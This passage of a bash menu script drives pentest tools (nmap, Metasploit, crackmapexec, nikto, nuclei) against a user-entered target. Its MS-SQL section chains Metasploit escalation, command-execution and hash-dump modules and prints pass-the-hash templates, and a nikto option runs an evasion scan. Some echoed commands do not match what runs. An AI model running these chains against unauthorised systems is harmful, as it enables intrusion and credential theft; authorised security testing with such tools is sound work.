                                          done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n";
                                                printf "${WHITE}Executing command: ${YELLOW}whois -h ${PURPLE}$IP${YELLOW} -p ${PURPLE}$PORT${YELLOW} && echo ${PURPLE}$DOMAINHOST${YELLOW} | nc -vn ${PURPLE}$PORT${YELLOW} \n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                whois -h $IP -p $PORT $DOMAINHOST && echo $DOMAINHOST | nc -vn $PORT ;printf "\n";;

                                    8)
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                    9)
                                        clear; 
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;printf "\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;printf "\n"                                      
                                        printf "${WHITE}Insert Domain:\n"${NC}
                                        read -e  DOMAINHOST;printf "\n"
                                        printf "${WHITE}Insert Password List:\n"${NC}
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;         

                                    10)
                                        clear;
                                        printf "Values Cleared!\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        unset IP
                                        unset PORT
                                        unset DOMAINHOST;; 

                                    0)
                                        clear;
                                        break;;

                                esac
                        done;;
#ms-sql
                    9)
                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Nmap ${NC}"
                            echo -e "${CYAN}2. MetaSploit${NC}" 
                            echo -e "${CYAN}3. Crackmapexec ${NC}"   
                            echo -e "${GREEN}4. Show Values ${NC}"
                            echo -e "${GREEN}5. Set Values ${NC}"
                            echo -e "${GREEN}6. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-6]: ${NC}"
                            printf ${WHITE};
                            read -e  -r mssql;
                            printf "\n";clear;

                                case $mssql in

                                    1)
                                    while [[ $IP == "" ]]; do
                                        printf "${WHITE}Insert Target IP Address:\n${NC}"
                                        read -e IP
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done

                                    printf "${WHITE}Insert Port (${YELLOW}ex: 1433${WHITE}):\n${NC}"
                                    read -e PORT
                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                    printf "${WHITE}Insert FLAG:\n${NC}"
                                    read -e FLAG
                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                    printf "${WHITE}Insert File Name (leave blank for no output file):\n${NC}"
                                    read -e FILENAME

                                    if [[ $PORT == "" ]]; then
                                        PORT="1433"  
                                    fi

                                    if [[ $FILENAME != "" ]]; then
                                        OUTPUT_FLAG="-oN"
                                        OUTPUT_FILE="$FILENAME"
                                    else
                                        OUTPUT_FLAG=""
                                        OUTPUT_FILE=""
                                    fi

                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    clear
                                    printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                    printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                    printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -p $PORT -sV --script 'ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info' $IP $OUTPUT_FLAG $OUTPUT_FILE\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}"

                                    nmap $FLAG -sV -p $PORT --script "ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info" $IP $OUTPUT_FLAG $OUTPUT_FILE
                                    printf "\n";;

                                    2)
                                        while [[ $IP == "" || $PORT == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Target Port(${YELLOW}Default: 1433${WHITE}):\n";printf "${NC}";
                                                read -e  PORT;
                                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"                   

                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                printf "${WHITE}Executing ${PURPLE}MetaSploit MS-SQL ${NC}Enumeration\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}" 
                                                msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use auxiliary/admin/mssql/mssql_enum; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use admin/mssql/mssql_enum_domain_accounts; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use admin/mssql/mssql_enum_sql_logins; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS $IP; set RPORT $PORT; run; exit" && msfconsole -q -x "use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS $IP; set RPORT $PORT; run; exit";printf "\n";; 
                                    3)
                                    echo -e "${NC}-------------------------------------------${NC}\n" 
                                    echo -e "${CYAN}1. Username + Password + CMD command  \ncrackmapexec mssql -d ${NC}<Domain name>${CYAN} -u ${NC}<username>${CYAN} -p ${NC}<password>${CYAN} -x "${NC}whoami${CYAN}"";printf "\n"
                                    echo -e "2. Username + Hash + PS command \ncrackmapexec mssql -d ${NC}<Domain name>${CYAN} -u ${NC}<username>${CYAN} -H ${NC}<HASH>${CYAN} -X '${NC}$ PSVersionTable${CYAN}'\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                                    4)
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                    5)
                                        clear; 
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;printf "\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;printf "\n"                     
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;         

                                    6)
                                        clear;
                                        printf "Values Cleared!\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        unset IP
                                        unset PORT;; 

                                    0)
                                        clear;
                                        break;;
                                esac
                        done;;


#netbios
                    10)
                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Nmap ${NC}"
                            echo -e "${CYAN}2. Nbtscan${NC}" 
                            echo -e "${CYAN}3. Nmblookup ${NC}"   
                            echo -e "${GREEN}4. Show Values ${NC}"
                            echo -e "${GREEN}5. Set Values ${NC}"
                            echo -e "${GREEN}6. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-6]: ${NC}"
                            printf ${WHITE};
                            read -e  -r nbt;
                            printf "\n";clear;

                                case $nbt in
                                    1)
                                        while [[ $IP == "" || $FILENAME == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 137${WHITE}):\n";printf "${NC}";
                                                read -e  PORT;
                                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                                read -e  FLAG;
                                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                read -e  FILENAME;
                                                printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"                   

                                        done

                                                if [[ $PORT != "" ]]
                                                then    
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -p ${PURPLE}$PORT${YELLOW} -sV -sU -T4 -n --script '${PURPLE}nbstat.nse${YELLOW}' ${PURPLE}$IP${YELLOW} -oN ${CYAN}$FILENAME${YELLOW}\n\n";
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        sudo nmap $FLAG -sV -sU -T4 -n -p $PORT --script "nbstat.nse" $IP -oN /home/$USER/$FOLDER/$FILENAME;printf "\n";
                                                        unset FILENAME;
                                                else
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV -sU -T4 -n --script '${PURPLE}nbstat.nse${YELLOW}' -p 137 ${PURPLE}$IP${YELLOW} -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        sudo nmap $FLAG -sV -sU -T4 -n --script "nbstat.nse" -p 137 $IP -oN /home/$USER/$FOLDER/$FILENAME;printf "\n";
                                                        unset FILENAME; 
                                                fi;;

                                    2)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target(${YELLOW}ex: 192.168.1.1 or 192.168.1.1/30${WHITE}): ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}nbtscan ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                nbtscan $IP;printf "\n";;

                                    3)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}nmblookup -A ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                nmblookup -A $IP;printf "\n";;
                                    0)
                                        clear;
                                        break;;
                                esac
                        done;;


                    11)
                        clear;
                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                        echo -e "${NC}-------------------------------------------${NC}\n";;

                    12)
                        clear; 
                        printf "${WHITE}Insert Target IP:\n"${NC}
                        read -e  IP;printf "\n"
                        clear;
                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                        echo -e "${NC}-------------------------------------------${NC}\n";;

                    13)
                        clear;
                        printf "Target Cleared!\n\n"
                        echo -e "${NC}-------------------------------------------${NC}\n"
                        unset IP;;

                    0)
                        clear;
                        break;;
                esac
            done;; 



#webserver
            6)

                while : ; do

                    printf "${WHITE}Select A Tool:${NC}\n\n"
                    echo -e "${CYAN}1. Nuclei ${NC}"
                    echo -e "${CYAN}2. Nikto ${NC}"
                    echo -e "${CYAN}3. Nmap ${NC}"
                    echo -e "${CYAN}4. Check Firewall ${NC}"
                    echo -e "${GREEN}5. Show Target ${NC}"
                    echo -e "${GREEN}6. Set Target ${NC}"
                    echo -e "${GREEN}7. Clear Target ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-7]: ${NC}"
                    printf ${WHITE};
                    read -e  -r webserver;
                    printf "\n";clear;

                        case $webserver in 

                            1) 

                                while : ; do

                                printf "${WHITE}Select An Option:${NC}\n\n"
                                echo -e "${CYAN}1. Scan ${NC}"
                                echo -e "${CYAN}2. Basic Flags ${NC}"
                                echo -e "${CYAN}3. Update ${NC}"
                                echo -e "${GREEN}4. Show Target ${NC}"
                                echo -e "${GREEN}5. Set Target ${NC}"
                                echo -e "${GREEN}6. Clear Target ${NC}"
                                echo -e "${YELLOW}0. Back ${NC}\n"
                                echo -n -e "${RED}Enter selection [0-6]: ${NC}"
                                printf ${WHITE};
                                read -e  -r nuclei;
                                printf "\n";clear;



                                    case $nuclei in 

                                        1)
                                            
                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target URL Address:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done

                                            if [[ $FILENAME == "" ]]
                                            then
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nuclei -u ${PURPLE}$IP${YELLOW}\n\n"
                                                    nuclei -u $IP
                                                    printf "\n"
                                            else
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nuclei -u ${PURPLE}$IP${YELLOW} -o ${CYAN}$FILENAME${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nuclei -u $IP -o /home/$USER/$FOLDER/$FILENAME ;unset FILENAME; printf "\n"
                                            fi;;

                                        2) 
                                            while [[ $IP == "" || $RATE == "" || $CONCURRENCY == "" || $TIMEOUT == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target URL Address:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Rate Limit (${YELLOW}ex: 20${WHITE}):\n";printf "${NC}";
                                                    read -e  RATE;
                                                    printf "${WHITE}Rate Limit: ${YELLOW}$RATE${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Concurrency (${YELLOW}ex: 5${WHITE}):\n";printf "${NC}";
                                                    read -e  CONCURRENCY;
                                                    printf "${WHITE}Concurrency: ${YELLOW}$CONCURRENCY${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Timeout (${YELLOW}ex: 10${WHITE}):\n";printf "${NC}"
                                                    read -e  TIMEOUT;
                                                    printf "${WHITE}Time Out: ${YELLOW}$TIMEOUT${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done

                                            if [[ $FILENAME == "" ]]
                                            then
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nuclei -u ${PURPLE}$IP${YELLOW} -rate-limit ${PURPLE}$RATE${YELLOW} -concurrency ${PURPLE}$CONCURRENCY${YELLOW} -timeout ${PURPLE}$TIMEOUT${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nuclei -u $IP -rate-limit $RATE -concurrency $CONCURRENCY -timeout $TIMEOUT ;printf "\n"
                                                    unset RATE; unset CONCURRENCY; unset TIMEOUT;unset FILENAME 
                                                    printf "\n"
                                            else
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nuclei -u ${PURPLE}$IP${YELLOW} -rate-limit ${PURPLE}$RATE${YELLOW} -concurrency ${PURPLE}$CONCURRENCY${YELLOW} -timeout ${PURPLE}$TIMEOUT${YELLOW} -o ${CYAN}$FILENAME${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nuclei -u $IP -rate-limit $RATE -concurrency $CONCURRENCY -timeout $TIMEOUT -o /home/$USER/$FOLDER/$FILENAME ;printf "\n"
                                                    unset RATE; unset CONCURRENCY; unset TIMEOUT;unset FILENAME
                                            fi;;
                                      

                                        3) 
                                          sudo nuclei --update
                                          printf "Nuclei Updated\n\n";;



                                        4)
                                                    clear;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                                        5)
                                                    clear; 
                                                    printf "${WHITE}Insert Target IP:\n"${NC}
                                                    read -e  IP;printf "\n"
                                                    clear;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                                        6)
                                                    clear;
                                                    printf "Target Cleared!\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                                    unset IP;;

                                        0)     
                                                clear;
                                                break;;

                                    esac    


                                done;;

                            2) 

                                while : ; do

                                printf "${WHITE}Select An Option:${NC}\n\n"
                                echo -e "${CYAN}1. Scan ${NC}"
                                echo -e "${CYAN}2. Evasion Scan ${NC}"
                                echo -e "${CYAN}3. Tuning Flag ${NC}"
                                echo -e "${CYAN}4. Update ${NC}"
                                echo -e "${GREEN}5. Show Target ${NC}"
                                echo -e "${GREEN}6. Set Target ${NC}"
                                echo -e "${GREEN}7. Clear Target ${NC}"
                                echo -e "${YELLOW}0. Back ${NC}\n"
                                echo -n -e "${RED}Enter selection [0-7]: ${NC}"
                                printf ${WHITE};
                                read -e  -r nikto;
                                printf "\n";clear;                     

                                    case $nikto in 

                                        1) 

                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target URL Address:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"         

                                            done

                                            if [[ $FILENAME == "" ]]
                                            then
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nuclei -h ${PURPLE}$IP${YELLOW} \n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nikto -h $IP ;printf "\n"
                                            else
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nuclei -h ${PURPLE}$IP${YELLOW} -o ${CYAN}$FILENAME${YELLOW} \n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nikto -h $IP -o /home/$USER/$FOLDER/$FILENAME; printf "\n"
                                                    unset FILENAME
                                            fi;;

                                        2)

                                            while [[ $IP == "" || $PORT == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target URL Address:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 443${WHITE}):\n";printf "${NC}";
                                                    read -e  PORT;
                                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done

                                            if [[ $FILENAME == "" ]]
                                            then
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nikto -h ${PURPLE}$IP${YELLOW} -port ${PURPLE}$PORT${YELLOW} --evasion -mutate\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nikto -h $IP -port $PORT --evasion -mutate;printf "\n"
                                            else
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nikto -h ${PURPLE}$IP${YELLOW} -port ${PURPLE}$PORT${YELLOW} --evasion -mutate -o ${CYAN}$FILENAME${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nikto -h $IP -port $PORT --evasion -mutate -o /home/$USER/$FOLDER/$FILENAME  ;printf "\n"
                                                    unset FILENAME
                                            fi;;

                                        3) 

                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target URL Address:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done

                                            if [[ $FILENAME == "" ]]
                                            then
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nuclei -h ${PURPLE}$IP${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nikto -h $IP - Tuning x;printf "\n"
                                            else
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nuclei -h ${PURPLE}$IP${YELLOW} -o ${CYAN}$FILENAME${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nikto -h $IP - Tuning x -o /home/$USER/$FOLDER/$FILENAME ;printf "\n"
                                                    unset FILENAME
                                            fi;;

                                        4)
                                          sudo nikto -update;;

                                        5)
                                                    clear;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                                        6)
                                                    clear; 
                                                    printf "${WHITE}Insert Target IP:\n"${NC}
                                                    read -e  IP;printf "\n"
                                                    clear;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                                        7)
                                                    clear;
                                                    printf "Values Cleared!\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                                    unset IP
                                                    unset FILENAME;;

                                        0)     
                                                clear;
                                                break;;

                                    esac

                                done;;

                            3) 

                                while : ; do

                                printf "${WHITE}Select An Option:${NC}\n\n"
                                echo -e "${CYAN}1. Basic Scan ${NC}"
                                echo -e "${CYAN}2. Http-Enum ${NC}"
                                echo -e "${CYAN}3. Http-Frontpage-Login ${NC}"
                                echo -e "${CYAN}4. Http-Passwd ${NC}"
                                echo -e "${CYAN}5. Http Error Pages ${NC}"
                                echo -e "${CYAN}6. All Http Scripts ${NC}"
                                echo -e "${GREEN}7. Show Target Ip & Port ${NC}"
                                echo -e "${GREEN}8. Set Target Ip & Port ${NC}"
                                echo -e "${GREEN}9. Clear Values ${NC}"
                                echo -e "${YELLOW}0. Back ${NC}\n"
                                echo -n -e "${RED}Enter selection [0-8]: ${NC}"
                                printf ${WHITE};
                                read -e  -r nmapp;
                                printf "\n";clear;                     

                                    case $nmapp in 

                                        1) 

                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address(${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                                    read -e  FLAG;
                                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"            

                                            done

                                            if [[ $FILENAME == "" ]]
                                            then
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG ${CYAN}$IP${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nmap $IP $FLAG;printf "\n"; 

                                            else
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG ${CYAN}$IP${YELLOW} -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    nmap $IP $FLAG -oN /home/$USER/$FOLDER/$FILENAME;printf "\n";
                                                    unset FILENAME
                                            fi;;

                                        2)

                                            while [[ $IP == ""  ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address(${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 80,443${WHITE}):\n";printf "${NC}";
                                                    read -e  PORT;
                                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                                    read -e  FLAG;
                                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    if [[ -n "$FILENAME" ]]; then
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    fi
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    if [[ $PORT != "" ]]
                                                    then    
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-enum${YELLOW} -p ${PURPLE}$PORT${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME} \n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-enum -p$PORT $IP -oN /home/$USER/$FOLDER/$FILENAME;printf "\n";unset FILENAME;
                                                    else
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-enum${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-enum $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME};printf "\n";unset FILENAME;
                                                    fi
                                                    ;; 


                                        3) 

                                            while [[ $IP == ""  ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address(${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 80,443${WHITE}):\n";printf "${NC}";
                                                    read -e  PORT;
                                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                                    read -e  FLAG;
                                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    if [[ -n "$FILENAME" ]]; then
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    fi
                                                    echo -e "${NC}-------------------------------------------${NC}\n"                
                                            done
                                                    if [[ $PORT != "" ]]
                                                    then    
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
